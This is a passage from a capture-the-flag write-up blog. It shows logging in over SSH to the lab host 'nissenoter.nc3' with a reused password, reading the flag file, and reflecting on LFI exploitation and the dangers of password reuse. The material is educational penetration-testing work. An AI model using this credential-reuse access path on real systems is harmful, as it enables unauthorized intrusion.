+</span></span></code></pre></div><p>Fantastic! It would appear that the naughty reindeer reused his password! (Hopefully Santa won&rsquo;t find out&mldr;)</p><h3 id=getting-the-second-flag>Getting the second flag<a href=#getting-the-second-flag class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>With valid SSH credentials we simply login and fetch the user flag!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ ssh rrensdyr@nissenoter.nc3
+</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;nissenoter.nc3 (77.229.233.52)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ED25519 key fingerprint is SHA256:1SsZXNDRtiFTRXEnxik0vXpDFxbCdgSSjVsxdSE6wvs.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>This key is not known by any other names.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>nissenoter.nc3<span style=color:#e6db74>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>rrensdyr@nissenoter.nc3&#39;</span>s password:
+</span></span><span style=display:flex><span>Linux edc9b2907c7e 5.15.0-88-generic <span style=color:#75715e>#98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
+</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style=display:flex><span>permitted by applicable law.
+</span></span><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ ls
+</span></span><span style=display:flex><span>flag.txt
+</span></span><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ cat flag.txt
+</span></span><span style=display:flex><span>NC3<span style=color:#f92672>{</span>1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!<span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>Now we can go submit the second flag and move on to the final stage in <a href=/nc3/boot2root/nissenoter-3/>Nissenoter 3</a>!</p><h2 id=flag>Flag<a href=#flag class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>NC3{1. Snup passwd; 2. Genbrug er god brug; 3: ????; 4: Profit!}
+</span></span></code></pre></div><h2 id=reflections-and-learnings>Reflections and Learnings<a href=#reflections-and-learnings class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=importance-of-detailed-enumeration>Importance of Detailed Enumeration:<a href=#importance-of-detailed-enumeration class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The initial exploration of the web application was crucial. Identifying endpoints and functionalities laid the groundwork for the subsequent steps. It highlighted the significance of a comprehensive reconnaissance phase in any security assessment.</p><h3 id=exploiting-local-file-inclusion-lfi>Exploiting Local File Inclusion (LFI):<a href=#exploiting-local-file-inclusion-lfi class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Unraveling the LFI vulnerability by dissecting the PHP code was not an easy journey, but however a critical juncture. This not only emphasized the need for a deep understanding of application behavior but also illustrated how security flaws can be hidden in the logic and routing of an application.</p><h3 id=innovating-approaches>Innovating Approaches:<a href=#innovating-approaches class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The .htaccess files turned out to be a dead-end, which you will face many off when doing CTF events! It is important to accept that a path may not be right and be open-minded enough to pivot towards new paths!</p><h3 id=the-perils-of-password-reuse>The Perils of Password Reuse:<a href=#the-perils-of-password-reuse class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The reuse of passwords, as demonstrated by the &lsquo;rrensdyr&rsquo; user, served as a practical example of common security oversights. This scenario stressed the necessity of robust password practices and the risks associated with password reuse.</p><h3 id=the-journey-from-vulnerability-to-access>The Journey from Vulnerability to Access:<a href=#the-journey-from-vulnerability-to-access class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The step-by-step process, from finding vulnerabilities to gaining system access, is a fundamental pattern in penetration testing. This challenge was a testament to the need for patience, thoroughness, and resilience in security testing!</p></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://ctf.adamino.dk/>Adamino</a>
+&#183; The quieter you become the more you are able to hear
+&#183;</p></footer><a href=# class=scroll-up><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a><noscript><a href=# class="scroll-up show"><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a></noscript><script async src=https://ctf.adamino.dk/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin=anonymous></script><script async src=https://ctf.adamino.dk/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin=anonymous></script></body></html>
